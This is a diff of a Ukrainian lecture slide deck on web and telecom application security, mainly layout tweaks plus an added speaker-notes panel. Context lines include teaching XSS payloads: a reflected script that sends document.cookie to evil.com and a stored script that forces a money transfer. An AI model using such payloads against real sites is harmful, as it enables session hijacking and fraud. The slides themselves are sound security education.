@@ -32,6 +32,46 @@
             max-height: 100% !important;
             box-sizing: border-box !important;
         }
+
+        /* ===== Notes Panel ===== */
+        #notes-btn {
+            position: fixed; bottom: 18px; right: 90px; z-index: 10000;
+            background: #1f6feb; color: #fff; border: none; border-radius: 50%;
+            width: 46px; height: 46px; font-size: 1.25em; cursor: pointer;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.55); transition: background 0.2s;
+            display: flex; align-items: center; justify-content: center;
+        }
+        #notes-btn:hover { background: #388bfd; }
+        #notes-panel {
+            position: fixed; top: 0; right: -420px; width: 410px; height: 100%;
+            background: #0d1117; border-left: 1px solid #30363d;
+            z-index: 9999; display: flex; flex-direction: column;
+            transition: right 0.28s cubic-bezier(.4,0,.2,1);
+            box-shadow: -4px 0 20px rgba(0,0,0,0.5);
+        }
+        #notes-panel.open { right: 0; }
+        #notes-panel-header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 12px 16px; border-bottom: 1px solid #30363d;
+            background: #161b22; flex-shrink: 0;
+        }
+        #notes-panel-header h4 { margin: 0; color: #c9d1d9; font-size: 0.9em; }
+        #notes-close-btn {
+            background: none; border: none; color: #888; font-size: 1.2em;
+            cursor: pointer; padding: 4px; line-height: 1;
+        }
+        #notes-close-btn:hover { color: #fff; }
+        #notes-panel-body {
+            flex: 1; overflow-y: auto; padding: 16px;
+            color: #c9d1d9; font-size: 0.85em; line-height: 1.6;
+        }
+        #notes-panel-body h3 { color: #58a6ff; font-size: 1em; margin: 0.6em 0 0.3em; }
+        #notes-panel-body h4 { color: #e8b04b; font-size: 0.95em; margin: 0.5em 0 0.2em; }
+        #notes-panel-body ul { padding-left: 1.3em; margin: 0.3em 0; }
+        #notes-panel-body li { margin: 0.2em 0; }
+        #notes-panel-body code { background: #1f2428; padding: 1px 4px; border-radius: 3px; font-size: 0.88em; color: #79c0ff; }
+        #notes-panel-body p { margin: 0.3em 0; }
+        #notes-panel-body strong { color: #f0f6fc; }
     </style>
 </head>
 <body>
@@ -291,7 +331,7 @@ hash = ph.hash(password)</code></pre>
                             <strong style="color:#da3633;">Reflected XSS</strong> — шкідливий скрипт у запиті, відображається у відповіді<br>
                             <code>https://site.com/search?q=&lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;</code>
                         </div>
-                        <div class="box" style="border-color:#da3633; font-size:0.78em; margin-top:0.3em;">
+                        <div class="box" style="border-color:#da3633; font-size:0.75em; margin-top:0.15em;">
                             <strong style="color:#da3633;">Stored XSS</strong> — скрипт зберігається в БД і виконується у всіх відвідувачів<br>
                             <code>&lt;script&gt;fetch('/transfer',{method:'POST',body:'to=attacker&amp;amount=1000'})&lt;/script&gt;</code>
                         </div>
@@ -306,7 +346,7 @@ hash = ph.hash(password)</code></pre>
                             <li><span class="highlight">Output encoding</span> — HTML-entities при виведенні даних у HTML</li>
                             <li><span class="highlight">Content Security Policy (CSP)</span> — заборона inline-скриптів</li>
                             <li><span class="highlight">HTTPOnly cookie</span> — JS не може читати session cookie</li>
-                            <li><span class="highlight">X-XSS-Protection: 1; mode=block</span></li>
+                            <li><span class="highlight">SameSite cookie</span> — додатково зменшує ризики експлуатації через браузер</li>
                             <li><span class="highlight">Використовуйте фреймворк</span> — React, Vue auto-escape</li>
                             <li>Уникати <code>innerHTML</code>, <code>document.write</code>, <code>eval()</code></li>
                             <li>DOMPurify для sanitization HTML-вмісту</li>
@@ -453,8 +493,8 @@ url=http://metadata.google.internal/
             </section>
 
             <!-- ===== СЛАЙД 12: OWASP API Security Top 10 ===== -->
-            <section>
-                <h2>OWASP API Security Top 10</h2>
+            <section style="font-size:0.86em;">
+                <h2 style="margin-bottom:0.1em;">OWASP API Security Top 10</h2>
                 <div class="two-col">
                     <div>
                         <table>
@@ -475,7 +515,7 @@ url=http://metadata.google.internal/
                     </div>
                     <div>
                         <h3>🛡️ API Security — ключові принципи</h3>
-                        <ul style="font-size:0.82em;">
+                        <ul style="font-size:0.75em;">
                             <li><span class="highlight">Authn + Authz на кожному endpoint</span> — не лише на рівні маршрутизатора</li>
                             <li><span class="highlight">Rate limiting</span> — по IP, по user, по endpoint</li>
                             <li><span class="highlight">Версіонування</span> — деприкейт старих версій</li>
@@ -714,8 +754,8 @@ add_header Content-Security-Policy
                 <h2>Інструменти тестування безпеки веб-застосунків</h2>
                 <div class="two-col">
                     <div>
-                        <h3>🔍 SAST — Static Application Security Testing</h3>
-                        <table>
+                        <h3 style="margin-bottom:0.1em;">🔍 SAST — Static Application Security Testing</h3>
+                        <table style="font-size:0.65em;">
                             <thead><tr><th>Інструмент</th><th>Мови</th><th>Примітка</th></tr></thead>
                             <tbody>
                                 <tr><td><span class="tag-green">Semgrep</span></td><td>20+ мов</td><td>Відкритий, швидкий, custom rules</td></tr>
@@ -724,8 +764,8 @@ add_header Content-Security-Policy
                                 <tr><td><span class="tag">CodeQL</span></td><td>C/C++/Java/JS</td><td>GitHub Advanced Security</td></tr>
                             </tbody>
                         </table>
-                        <h3 style="margin-top:0.4em;">🌐 DAST — Dynamic Application Security Testing</h3>
-                        <table>
+                        <h3 style="margin-top:0.2em; margin-bottom:0.1em;">🌐 DAST — Dynamic Application Security Testing</h3>
+                        <table style="font-size:0.65em;">
                             <thead><tr><th>Інструмент</th><th>Тип</th><th>Примітка</th></tr></thead>
                             <tbody>
                                 <tr><td><span class="tag-green">OWASP ZAP</span></td><td>DAST (open)</td><td>CI/CD, API scanning</td></tr>
@@ -735,8 +775,8 @@ add_header Content-Security-Policy
                         </table>
                     </div>
                     <div>
-                        <h3>🔑 Спеціалізовані інструменти</h3>
-                        <ul style="font-size:0.82em;">
+                        <h3 style="margin-bottom:0.1em;">🔑 Спеціалізовані інструменти</h3>
+                        <ul style="font-size:0.72em;">
                             <li><span class="tag">sqlmap</span> — автоматичне знаходження SQL Injection</li>
                             <li><span class="tag">ffuf / gobuster</span> — fuzzing директорій та параметрів</li>
                             <li><span class="tag">jwt_tool</span> — тестування JWT-токенів</li>
@@ -744,8 +784,8 @@ add_header Content-Security-Policy
                             <li><span class="tag">Amass / subfinder</span> — reconnaissance поддоменів</li>
                             <li><span class="tag">Postman / Bruno</span> — API-тестування</li>
                         </ul>
-                        <h3 style="margin-top:0.4em;">📊 Bug Bounty платформи</h3>
-                        <ul style="font-size:0.82em;">
+                        <h3 style="margin-top:0.15em; margin-bottom:0.1em;">📊 Bug Bounty платформи</h3>
+                        <ul style="font-size:0.72em;">
                             <li><span class="tag-green">HackerOne</span> — найбільша платформа, програми великих компаній</li>
                             <li><span class="tag-green">Bugcrowd</span> — managed bug bounty</li>
                             <li><span class="tag">Intigriti</span> — популярна в Європі</li>
@@ -847,7 +887,7 @@ location /login {
                 <div class="two-col">
                     <div>
                         <h3>✅ Рівень застосунку</h3>
-                        <ul style="font-size:0.82em;">
+                        <ul style="font-size:0.75em;">
                             <li>Валідація всіх вхідних даних (whitelist, server-side)</li>
                             <li>Параметризовані запити для всіх БД-взаємодій</li>
                             <li>Output encoding у контексті виводу (HTML, JS, URL)</li>
@@ -856,8 +896,8 @@ location /login {
                             <li>Dependency scanning (Snyk, Dependabot) — регулярно</li>
                             <li>Security headers на всіх відповідях</li>
                         </ul>
-                        <h3 style="margin-top:0.4em;">✅ Рівень аутентифікації</h3>
-                        <ul style="font-size:0.82em;">
+                        <h3 style="margin-top:0.2em;">✅ Рівень аутентифікації</h3>
+                        <ul style="font-size:0.75em;">
                             <li>MFA для всіх привілейованих дій</li>
                             <li>bcrypt/Argon2id для паролів</li>
                             <li>Безпечне відновлення паролю (short-lived токени)</li>
@@ -866,15 +906,15 @@ location /login {
                     </div>
                     <div>
                         <h3>✅ Рівень інфраструктури</h3>
-                        <ul style="font-size:0.82em;">
+                        <ul style="font-size:0.75em;">
                             <li>HTTPS скрізь, HSTS preloading</li>
                             <li>WAF перед кожним публічним endpoint</li>
                             <li>Мережева сегментація (DMZ, Private subnets)</li>
                             <li>Regular penetration testing (щоквартально)</li>
                             <li>Patch management — критичні ≤ 24год, важливі ≤ 7 днів</li>
                         </ul>
-                        <h3 style="margin-top:0.4em;">✅ Рівень процесів</h3>
-                        <ul style="font-size:0.82em;">
+                        <h3 style="margin-top:0.2em;">✅ Рівень процесів</h3>
+                        <ul style="font-size:0.75em;">
                             <li>Threat Modeling на етапі проектування</li>
                             <li>Code Review з фокусом на безпеку</li>
                             <li>SAST/DAST у кожному CI/CD pipeline</li>
@@ -930,20 +970,20 @@ location /login {
             </section>
 
             <!-- ===== СЛАЙД 23: Телеком веб-застосунки — специфіка ===== -->
-            <section>
+            <section style="font-size:0.86em;">
                 <h2>Телеком веб-застосунки — унікальна поверхня атаки</h2>
                 <div class="two-col">
                     <div>
                         <h3>📡 Відмінності від корпоративного веб</h3>
-                        <ul style="font-size:0.8em;">
+                        <ul style="font-size:0.75em;">
                             <li><span class="highlight">Вимоги доступності:</span> 99.999% (5 nine) — 5 хв простою на рік</li>
                             <li><span class="highlight">Реальний час:</span> VoIP, відео, сигналізація — затримка &lt; 150 мс</li>
                             <li><span class="highlight">Масштаб:</span> мільйони одночасних сесій, CDR, білінг</li>
                             <li><span class="highlight">Регуляторні вимоги:</span> ETSI, 3GPP, GSMA, PCI DSS, CALEA</li>
                             <li><span class="highlight">Legacy-протоколи:</span> SS7, Diameter, ISDN поруч із REST/HTTP/2</li>
                         </ul>
-                        <h3 style="margin-top:0.4em;">🎯 Поверхня атаки телеком-веб</h3>
-                        <ul style="font-size:0.8em;">
+                        <h3 style="margin-top:0.2em;">🎯 Поверхня атаки телеком-веб</h3>
+                        <ul style="font-size:0.75em;">
                             <li>Портали самообслуговування абонентів (billing, usage)</li>
                             <li>OAM/OSS/BSS веб-інтерфейси управління мережею</li>
                             <li>NFV/SDN веб-панелі (OpenStack Horizon, ONAP)</li>
@@ -973,7 +1013,7 @@ location /login {
 
             <!-- ===== СЛАЙД 24: VoIP/SIP — протоколи та вразливості ===== -->
             <section>
-                <h2>VoIP/SIP — протоколи та вразливості</h2>
+                <h2 style="margin-bottom:0.1em;">VoIP/SIP — протоколи та вразливості</h2>
                 <div class="two-col">
                     <div>
                         <h3>📞 SIP (Session Initiation Protocol)</h3>
@@ -987,7 +1027,7 @@ location /login {
                                 <li><span class="tag">B2BUA</span> Back-to-Back UA (SBC)</li>
                             </ul>
                         </div>
-                        <h3 style="margin-top:0.3em;">📋 Методи SIP → атаки</h3>
+                        <h3 style="margin-top:0.15em; margin-bottom:0.1em;">📋 Методи SIP → атаки</h3>
                         <table>
                             <thead><tr><th>Метод SIP</th><th>Можлива атака</th></tr></thead>
                             <tbody>
@@ -1000,15 +1040,15 @@ location /login {
                         </table>
                     </div>
                     <div>
-                        <h3>⚠️ Типові SIP-атаки</h3>
-                        <ul style="font-size:0.82em;">
+                        <h3 style="margin-bottom:0.1em;">⚠️ Типові SIP-атаки</h3>
+                        <ul style="font-size:0.75em;">
                             <li><span class="tag-red">SIP Flooding</span> — тисячі INVITE/REGISTER → вичерпання ресурсів Proxy</li>
                             <li><span class="tag-red">Registration Hijacking</span> — перехоплення REGISTER → дзвінки перенаправляються до атакуючого</li>
                             <li><span class="tag-red">Toll Fraud</span> — несанкціоновані дорогі дзвінки через скомпрометований SIP-акаунт</li>
                             <li><span class="tag-red">Eavesdropping</span> — перехоплення RTP-медіа без шифрування</li>
                             <li><span class="tag-red">BYE Injection</span> — передчасне завершення чужого дзвінка</li>
                         </ul>
-                        <div class="box" style="border-color:#238636; font-size:0.78em; margin-top:0.3em;">
+                        <div class="box" style="border-color:#238636; font-size:0.75em; margin-top:0.15em;">
                             <strong>🛡️ Захист SIP:</strong>
                             <ul>
                                 <li><span class="tag-green">SIP-over-TLS</span> (SIPS) — шифрування сигналізації</li>
@@ -1043,15 +1083,15 @@ location /login {
                         </table>
                     </div>
                     <div>
-                        <h3>⚠️ Вразливості 5G SBI</h3>
-                        <ul style="font-size:0.82em;">
+                        <h3 style="margin-bottom:0.1em;">⚠️ Вразливості 5G SBI</h3>
+                        <ul style="font-size:0.75em;">
                             <li>Незахищені SBI-інтерфейси між NF у тій самій мережі</li>
                             <li>Відсутність mTLS між NF (тільки одностороння TLS)</li>
                             <li>Надмірно широкі OAuth 2.0 токени для NF-to-NF</li>
                             <li>Незахищений NRF — маніпуляція реєстром сервісів</li>
                             <li>HTTP/2 специфічні атаки (CONTINUATION flood, HPACK bomb)</li>
                         </ul>
-                        <div class="box" style="border-color:#238636; font-size:0.78em; margin-top:0.3em;">
+                        <div class="box" style="border-color:#238636; font-size:0.75em; margin-top:0.15em;">
                             <strong>✅ 3GPP TS 33.501 — вимоги безпеки 5G:</strong>
                             <ul>
                                 <li>Обов'язковий TLS 1.2+ для всіх SBI</li>
@@ -1066,7 +1106,7 @@ location /login {
             </section>
 
             <!-- ===== СЛАЙД 26: Telecom API — NEF, CAMARA, Open Gateway ===== -->
-            <section>
+            <section style="font-size:0.86em;">
                 <h2>Telecom API — NEF, CAMARA та GSMA Open Gateway</h2>
                 <div class="two-col">
                     <div>
@@ -1086,18 +1126,18 @@ location /login {
                         </table>
                     </div>
                     <div>
-                        <h3>🔐 Безпека CAMARA / GSMA Open Gateway</h3>
-                        <ul style="font-size:0.82em;">
+                        <h3 style="margin-bottom:0.1em;">🔐 Безпека CAMARA / GSMA Open Gateway</h3>
+                        <ul style="font-size:0.75em;">
                             <li><span class="highlight">OAuth 2.0 + PKCE</span> — стандарт автентифікації для CAMARA</li>
                             <li><span class="highlight">OIDC</span> — верифікація особи абонента (network-based auth)</li>
                             <li><span class="highlight">Rate limiting</span> — ліміти на кожен API-метод</li>
                             <li><span class="highlight">Consent management</span> — явна згода абонента</li>
                             <li><span class="highlight">API keys</span> + Developer Portal (реєстрація партнерів)</li>
                         </ul>
-                        <div class="box" style="border-color:#da3633; font-size:0.78em; margin-top:0.3em;">
+                        <div class="box" style="border-color:#da3633; font-size:0.75em; margin-top:0.15em;">
                             ⚠️ <strong>SIM Swap API — критичний для безпеки:</strong> банки використовують для перевірки, чи не була замінена SIM-карта перед SMS OTP. Зловживання → обхід 2FA.
                         </div>
-                        <div class="box" style="border-color:#238636; font-size:0.75em; margin-top:0.3em;">
+                        <div class="box" style="border-color:#238636; font-size:0.73em; margin-top:0.1em;">
                             ✅ <strong>AWS API Gateway</strong> + <strong>Cognito</strong> + <strong>WAF</strong> — типовий стек для захищеного розгортання CAMARA API в AWS
                         </div>
                     </div>
@@ -1120,8 +1160,8 @@ location /login {
                                 <li><span class="tag-red">IMSI catching</span> — збір ідентифікаторів абонентів</li>
                             </ul>
                         </div>
-                        <h3 style="margin-top:0.3em;">📊 Diameter (4G)</h3>
-                        <ul style="font-size:0.78em;">
+                        <h3 style="margin-top:0.15em; margin-bottom:0.05em;">📊 Diameter (4G)</h3>
+                        <ul style="font-size:0.75em;">
                             <li>Замінив SS7 у 4G LTE для EPC-сигналізації</li>
                             <li>Вразливий до схожих атак через відсутність автентифікації</li>
                             <li>Diameter Firewall — обов'язковий фільтр</li>
@@ -1137,13 +1177,13 @@ location /login {
                                 <tr><td><span class="tag">Cat 3</span> Моніторинг</td><td>Виявляти аномальні патерни запитів</td></tr>
                             </tbody>
                         </table>
-                        <ul style="font-size:0.8em; margin-top:0.3em;">
+                        <ul style="font-size:0.75em; margin-top:0.15em;">
                             <li><strong>GSMA FS.11</strong> — "SS7 and SIGTRAN Network Security" — стандарт захисту</li>
                             <li><strong>SS7 Firewall</strong> — фільтрація на рівні STPs (Signal Transfer Points)</li>
                             <li><strong>Моніторинг аномалій</strong> — машинне навчання для виявлення незвичних патернів</li>
                             <li><strong>Міграція на 5G</strong> — SBA без SS7-залежностей</li>
                         </ul>
-                        <div class="box" style="border-color:#e8b04b; font-size:0.75em; margin-top:0.3em;">
+                        <div class="box" style="border-color:#e8b04b; font-size:0.73em; margin-top:0.1em;">
                             💡 SMS OTP вразливий до SS7-атак. Рекомендація NIST SP 800-63B: уникати SMS як єдиного фактора MFA для критичних систем.
                         </div>
                     </div>
@@ -1151,12 +1191,12 @@ location /login {
             </section>
 
             <!-- ===== СЛАЙД 28: Mobile Apps — OWASP Mobile Top 10 ===== -->
-            <section>
+            <section style="font-size:0.86em;">
                 <h2>Mobile Apps безпека — OWASP Mobile Top 10</h2>
                 <div class="two-col">
                     <div>
-                        <h3>📱 OWASP Mobile Top 10 (2024)</h3>
-                        <table>
+                        <h3 style="margin-bottom:0.1em;">📱 OWASP Mobile Top 10 (2024)</h3>
+                        <table style="font-size:0.65em;">
                             <thead><tr><th>#</th><th>Вразливість</th><th>Приклад</th></tr></thead>
                             <tbody>
                                 <tr><td><span class="tag-red">M1</span></td><td>Improper Credential Usage</td><td>API key у вихідному коді APK</td></tr>
@@ -1173,8 +1213,8 @@ location /login {
                         </table>
                     </div>
                     <div>
-                        <h3>🛡️ Захист мобільних застосунків</h3>
-                        <div class="box" style="border-color:#1f6feb; font-size:0.78em;">
+                        <h3 style="margin-bottom:0.1em;">🛡️ Захист мобільних застосунків</h3>
+                        <div class="box" style="border-color:#1f6feb; font-size:0.72em;">
                             <strong>Android:</strong>
                             <ul>
                                 <li><span class="tag-green">Android Keystore</span> — зберігання ключів у TEE</li>
@@ -1183,7 +1223,7 @@ location /login {
                                 <li><span class="tag-green">Play Integrity API</span> — виявлення root/tamper</li>
                             </ul>
                         </div>
-                        <div class="box" style="border-color:#238636; font-size:0.78em; margin-top:0.3em;">
+                        <div class="box" style="border-color:#238636; font-size:0.72em; margin-top:0.15em;">
                             <strong>iOS:</strong>
                             <ul>
                                 <li><span class="tag-green">Secure Enclave</span> — апаратні ключі</li>
@@ -1198,7 +1238,7 @@ location /login {
             </section>
 
             <!-- ===== СЛАЙД 29: AWS API Gateway — архітектура та захист ===== -->
-            <section>
+            <section style="font-size:0.86em;">
                 <h2>AWS API Gateway — архітектура та захист</h2>
                 <div class="two-col">
                     <div>
@@ -1211,7 +1251,7 @@ location /login {
                                 <tr><td><span class="tag">WebSocket API</span></td><td>WebSocket</td><td>Real-time (чат, стрімінг)</td></tr>
                             </tbody>
                         </table>
-                        <h3 style="margin-top:0.3em;">🔐 Механізми авторизації</h3>
+                        <h3 style="margin-top:0.15em;">🔐 Механізми авторизації</h3>
                         <table>
                             <thead><tr><th>Тип</th><th>Коли використовувати</th></tr></thead>
                             <tbody>
@@ -1231,8 +1271,8 @@ location /login {
                             <p>⚙️ API GW → Lambda / ECS / Step Functions</p>
                             <p>📊 CloudWatch Logs + X-Ray tracing</p>
                         </div>
-                        <h3 style="margin-top:0.3em;">⚙️ Usage Plans та Throttling</h3>
-                        <ul style="font-size:0.8em;">
+                        <h3 style="margin-top:0.15em; margin-bottom:0.05em;">⚙️ Usage Plans та Throttling</h3>
+                        <ul style="font-size:0.75em;">
                             <li><strong>Throttling:</strong> 10,000 req/s default, burst 5,000</li>
                             <li><strong>Usage Plan:</strong> квоти на API Key (місяць/тиждень/день)</li>
                             <li><strong>Stage throttling:</strong> окремі ліміти для prod/staging</li>
@@ -1247,7 +1287,7 @@ resource "aws_wafv2_web_acl_association" {
             </section>
 
             <!-- ===== СЛАЙД 30: AWS WAF — Managed Rules та архітектура ===== -->
-            <section>
+            <section style="font-size:0.86em;">
                 <h2>AWS WAF — архітектура та Managed Rules</h2>
                 <div class="two-col">
                     <div>
@@ -1257,7 +1297,7 @@ resource "aws_wafv2_web_acl_association" {
                             <p>↳ <strong>Rule Groups</strong> → набори правил</p>
                             <p>&nbsp;&nbsp;↳ <strong>Rules</strong> → окремі умови та дії (Allow/Block/Count)</p>
                         </div>
-                        <h3 style="margin-top:0.3em;">📋 AWS Managed Rule Groups</h3>
+                        <h3 style="margin-top:0.15em; margin-bottom:0.05em;">📋 AWS Managed Rule Groups</h3>
                         <table>
                             <thead><tr><th>Rule Group</th><th>Захищає від</th></tr></thead>
                             <tbody>
@@ -1271,8 +1311,8 @@ resource "aws_wafv2_web_acl_association" {
                         </table>
                     </div>
                     <div>
-                        <h3>⚙️ Типи правил WAF</h3>
-                        <ul style="font-size:0.82em;">
+                        <h3 style="margin-bottom:0.05em;">⚙️ Типи правил WAF</h3>
+                        <ul style="font-size:0.75em;">
                             <li><span class="tag">IP set</span> — блокування/дозвіл за IP або CIDR</li>
                             <li><span class="tag">Geo match</span> — блокування/дозвіл за країною</li>
                             <li><span class="tag">Rate-based</span> — авто-блокування при перевищенні req/5хв</li>
@@ -1299,7 +1339,7 @@ rule {
             </section>
 
             <!-- ===== СЛАЙД 31: AWS Shield — DDoS-захист ===== -->
-            <section>
+            <section style="font-size:0.86em;">
                 <h2>AWS Shield — DDoS-захист інфраструктури та застосунків</h2>
                 <div class="two-col">
                     <div>
@@ -1326,7 +1366,7 @@ rule {
                             <p>🔥 <strong>AWS WAF</strong> — rate limiting, IP reputation, bot control</p>
                             <p>⚖️ <strong>ALB</strong> — connection draining, slow start, health checks</p>
                         </div>
-                        <h3 style="margin-top:0.3em;">📊 Типи DDoS та захист</h3>
+                        <h3 style="margin-top:0.15em; margin-bottom:0.05em;">📊 Типи DDoS та захист</h3>
                         <table>
                             <thead><tr><th>Атака</th><th>Рівень</th><th>Захист AWS</th></tr></thead>
                             <tbody>
@@ -1342,7 +1382,7 @@ rule {
             </section>
 
             <!-- ===== СЛАЙД 32: Amazon CloudFront — CDN та безпека ===== -->
-            <section>
+            <section style="font-size:0.86em;">
                 <h2>Amazon CloudFront — CDN та рівень безпеки</h2>
                 <div class="two-col">
                     <div>
@@ -1355,7 +1395,7 @@ rule {
                             <li><strong>Geo-restriction</strong> — блокування країн на рівні CDN</li>
                             <li><strong>Field-Level Encryption</strong> — шифрування конкретних полів запиту</li>
                         </ul>
-                        <h3 style="margin-top:0.3em;">⚡ CloudFront Functions vs Lambda@Edge</h3>
+                        <h3 style="margin-top:0.15em; margin-bottom:0.05em;">⚡ CloudFront Functions vs Lambda@Edge</h3>
                         <table>
                             <thead><tr><th></th><th>CF Functions</th><th>Lambda@Edge</th></tr></thead>
                             <tbody>
@@ -1617,7 +1657,7 @@ phases:
                 <p style="font-size:0.68em; color:#888; margin-top:0.3em;">Рекомендований мінімум для продуктивного веб: WAF + Shield Standard + CloudFront + GuardDuty</p>
             </section>
 
-            <!-- ===== СЛАЙД 38: Підсумок + Питання ===== -->
+            <!-- ===== СЛАЙД 38: Підсумок лекції ===== -->
             <section>
                 <h2>Підсумок лекції</h2>
                 <div class="two-col">
@@ -1650,15 +1690,22 @@ phases:
                                 <li><strong>Моніторинг 24/7</strong> — атаки тривають 277 днів непоміченими</li>
                             </ol>
                         </div>
-                        <div class="box" style="margin-top:0.5em; font-size:0.8em; border-color:#444;">
-                            <strong>📚 Наступна лекція 8:</strong> Моніторинг, логування та виявлення загроз в AWS — GuardDuty, Security Hub, CloudTrail, SIEM-інтеграція
-                        </div>
-                        <p style="font-size:1.1em; margin-top:0.6em; text-align:center;">
-                            <span class="highlight">Дякую за увагу!</span> 🎓
-                        </p>
-                        <p style="text-align:center; font-size:0.85em; color:#888;">Питання?</p>
                     </div>
                 </div>
+            </section>
+
+            <!-- ===== СЛАЙД 39: Анонс наступної лекції + Питання ===== -->
+            <section>
+                <h2>Що далі?</h2>
+                <div class="box" style="border-color:#1f6feb; max-width:680px; margin: 0.8em auto 0;">
+                    <h3 style="color:#58a6ff;">📚 Лекція 8: Моніторинг, логування та виявлення загроз</h3>
+                    <p style="font-size:0.88em; margin-top:0.4em;">GuardDuty &nbsp;·&nbsp; Security Hub &nbsp;·&nbsp; CloudTrail &nbsp;·&nbsp; SIEM-інтеграція</p>
+                    <p style="font-size:0.82em; color:#888; margin-top:0.3em;">Як побудувати систему виявлення загроз та реагування на інциденти в AWS-середовищі телеком-оператора</p>
+                </div>
+                <p style="font-size:1.3em; margin-top:1.2em; text-align:center;">
+                    <span class="highlight">Дякую за увагу!</span> 🎓
+                </p>
+                <p style="text-align:center; font-size:1.0em; color:#888; margin-top:0.4em;">Питання?</p>
             </section>
 
         </div>
@@ -1675,6 +1722,279 @@ phases:
             minScale: 0.2,
             maxScale: 1.05,
             scrollActivationWidth: 900
+        });
+    </script>
+
+    <!-- ===== Notes Button + Panel ===== -->
+    <button id="notes-btn" title="Конспект слайду">📄</button>
+    <div id="notes-panel">
+        <div id="notes-panel-header">
+            <h4>📄 Конспект</h4>
+            <button id="notes-close-btn" title="Закрити">✕</button>
+        </div>
+        <div id="notes-panel-body"></div>
+    </div>
+
+    <script>
+        /* ===== SLIDE NOTES DATA (one HTML entry per slide) ===== */
+        const SLIDE_NOTES = [
+            /* Слайд 1 */
+            `<h3>Безпека веб-застосунків у хмарному та телекомунікаційному контексті</h3>
+            <p>Сучасний цифровий світ невіддільно пов'язаний із веб-застосунками. Від порталів самообслуговування мобільних операторів до RESTful-інтерфейсів між мережевими функціями 5G — всюди присутній HTTP-стек, що несе в собі як колосальні можливості для бізнесу, так і широку поверхню для атак. За даними Verizon DBIR 2024, 43% зафіксованих порушень безпеки даних пов'язані з веб-застосунками, а середня вартість одного інциденту, за оцінкою IBM, становить 4,45 мільйона доларів США.</p>
+            <p>Роль веб-застосунків у телекомунікаційній галузі важко переоцінити: портали управління передплатою, інтерфейси OSS/BSS, відкриті API для партнерів, NFV/SDN-панелі — усі функціонують поверх HTTP(S). Навіть мережеві функції 5G SBA взаємодіють через HTTP/2 + JSON, перетворюючи серцевину телекомунікаційної мережі на розподілений мікросервісний застосунок.</p>
+            <p>Зв'язок між архітектурою та рівнем безпеки є прямим і нерозривним. Рішення, прийняті на стадії проектування — модель даних, схема автентифікації, обробка вхідних параметрів — визначають весь ландшафт вразливостей ще до написання першого рядка коду. Саме тому сучасна методологія безпечної розробки наголошує на концепції «Shift-Left Security».</p>`,
+
+            /* Слайд 2 */
+            `<h3>Структура та методологія лекції</h3>
+            <p>Лекція побудована за принципом від загального до конкретного і охоплює три взаємопов'язані напрямки. <strong>Частина 1</strong> присвячена фундаментальним принципам безпеки веб-застосунків: класифікації вразливостей за OWASP, механізмам захисту від кожного класу атак, стандартам аутентифікації та протоколам безпечної розробки. <strong>Частина 2</strong> заглиблюється в телекомунікаційну специфіку: протоколи VoIP/SIP, архітектуру 5G SBA, стандарти CAMARA та GSMA Open Gateway, вразливості SS7/Diameter, безпеку мобільних застосунків та AWS API Gateway.</p>
+            <p><strong>Частина 3</strong> фокусується на хмарних інструментах захисту AWS: WAF, Shield, CloudFront та побудові повного DevSecOps-пайплайну зі вбудованими перевірками безпеки на кожному етапі. Лекція завершується розглядом вимог регуляторної відповідності (PCI DSS, GDPR, ISO/IEC 27034) та практичним кейсом захищеного телеком-порталу в AWS.</p>`,
+
+            /* Слайд 3 */
+            `<h3>Ландшафт загроз для веб-застосунків</h3>
+            <p>Розуміння ландшафту загроз є необхідною передумовою для побудови ефективного захисту. Статистика DBIR 2024 демонструє чітку структуру: ін'єкції (SQL, XSS) займають перше місце з часткою ~32%, зловживання API — 21%, порушення автентифікації — 18%, DDoS на прикладному рівні — 16%, supply chain атаки — 13%. Середня тривалість від початку атаки до її виявлення без належного моніторингу — 277 днів (IBM CDBR).</p>
+            <p>Поверхня атаки типового веб-застосунку є надзвичайно широкою: вхідні дані користувача, API-ендпоінти, зовнішні залежності, механізми автентифікації, конфігурація сервера. У телекомунікаційному контексті ця поверхня суттєво розширюється: BSS/OSS-портали з прямим доступом до білінгових систем, OAM-інтерфейси управління мережею, між-операторські API для роумінгу, RESTful NF-інтерфейси 5G SBA.</p>
+            <p>Важливо розуміти, що атаки є значною мірою автоматизованими: боти сканують відомі вразливості (Log4Shell, Spring4Shell, outdated CMS) у глобальному масштабі, незалежно від розміру цілі. Концепція «security through obscurity» (безпека через непомітність) є хибною — невідомість системи не є захистом.</p>`,
+
+            /* Слайд 4 */
+            `<h3>OWASP Top 10 — теоретичні засади класифікації вразливостей</h3>
+            <p>Проєкт OWASP (Open Web Application Security Project) систематизує найпоширеніші вразливості веб-застосунків у рейтинг, що ґрунтується на даних аналізу тисяч реальних застосунків. Редакція 2021 відображає зміщення ризиків: <strong>A01 Broken Access Control</strong> посів першу сходинку, витіснивши Injection. Це відображає катастрофічне поширення помилок у реалізації авторизаційної логіки — 94% перевірених застосунків мали ту чи іншу форму Broken Access Control.</p>
+            <p><strong>A02 Cryptographic Failures</strong> охоплює неправильне або відсутнє шифрування: передача даних через HTTP, зберігання паролів у MD5/SHA1, застарілий TLS 1.0/1.1, захардкоджені ключі. <strong>A03 Injection</strong> попри давню відомість залишається критичним — SQL Injection, XSS, Command Injection можливі лише через неправильну обробку вхідних даних. <strong>A04 Insecure Design</strong> — відносно нова категорія, що підкреслює: безпека повинна бути закладена в архітектуру, а не додана після.</p>
+            <p><strong>A06 Vulnerable Components</strong> набуває особливої гостроти після Log4Shell (CVE-2021-44228): критична вразливість у широко вживаній бібліотеці одномоментно вразила мільйони систем. <strong>A10 SSRF</strong> вперше з'явився у топ-10 в 2021, що відображає зростаючу поширеність хмарних середовищ, де SSRF дозволяє отримати IAM-credentials через IMDSv1 — як це сталось у зламуванні Capital One у 2019 році.</p>`,
+
+            /* Слайд 5 */
+            `<h3>A01: Broken Access Control та IDOR — детальний теоретичний аналіз</h3>
+            <p>Broken Access Control є найпоширенішою вразливістю сучасних веб-застосунків. Її суть: застосунок не належним чином перевіряє, чи має конкретний автентифікований користувач право виконувати ту чи іншу дію або отримувати доступ до того чи іншого ресурсу. Це фундаментальна відмінність між <em>аутентифікацією</em> (перевіркою особи) та <em>авторизацією</em> (перевіркою прав).</p>
